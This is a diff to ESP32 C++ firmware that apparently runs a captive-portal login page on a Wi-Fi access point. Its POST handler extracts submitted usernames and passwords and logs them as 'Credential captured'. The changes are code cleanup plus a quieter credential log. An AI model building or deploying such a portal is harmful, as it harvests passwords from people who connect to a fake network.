@@ -64,6 +64,8 @@ static constexpr uint16_t DNS_PORT            = 53U;
 static constexpr size_t POST_BUF_MAX          = 256U;
 static constexpr uint8_t AP_CHANNEL           = 6U;
 static constexpr uint8_t AP_MAX_CONN          = 4U;
+static constexpr size_t HTTPD_MAX_URI         = 8U;
+static constexpr size_t HTTPD_STACK_SIZE      = 8192U;
 
 // ── Template descriptors ──────────────────────────────────────────────────────
 
@@ -804,8 +806,8 @@ private:
     bool startHttpServer()
     {
         httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-        config.max_uri_handlers = 8U;
-        config.stack_size = 8192U;
+        config.max_uri_handlers = HTTPD_MAX_URI;
+        config.stack_size = HTTPD_STACK_SIZE;
         config.lru_purge_enable = true;
 
         esp_err_t err = httpd_start(&httpServer_, &config);
@@ -901,7 +903,8 @@ private:
         }
 
         clientCount_ = 0U;
-        for (int i = 0; i < staList.num && clientCount_ < MAX_CONNECTED_CLIENTS; ++i)
+        for (size_t i = 0U; i < static_cast<size_t>(staList.num) &&
+                                 clientCount_ < MAX_CONNECTED_CLIENTS; ++i)
         {
             std::memcpy(clients_[clientCount_].mac, staList.sta[i].mac, 6U);
             ++clientCount_;
@@ -974,6 +977,7 @@ esp_err_t httpLoginGetHandler(httpd_req_t *req)
                 delete[] buf;
                 return ESP_OK;
             }
+            // Allocation failed – fall through to built-in template
             f.close();
         }
     }
@@ -1009,7 +1013,7 @@ esp_err_t httpLoginPostHandler(httpd_req_t *req)
     (void)extractField(postBuf, "user", user, sizeof(user));
     (void)extractField(postBuf, "pass", pass, sizeof(pass));
 
-    ESP_LOGI(TAG_CP, "Credential captured: user=%s", user);
+    ESP_LOGD(TAG_CP, "Credential captured");
 
     if (g_portalApp != nullptr)
     {
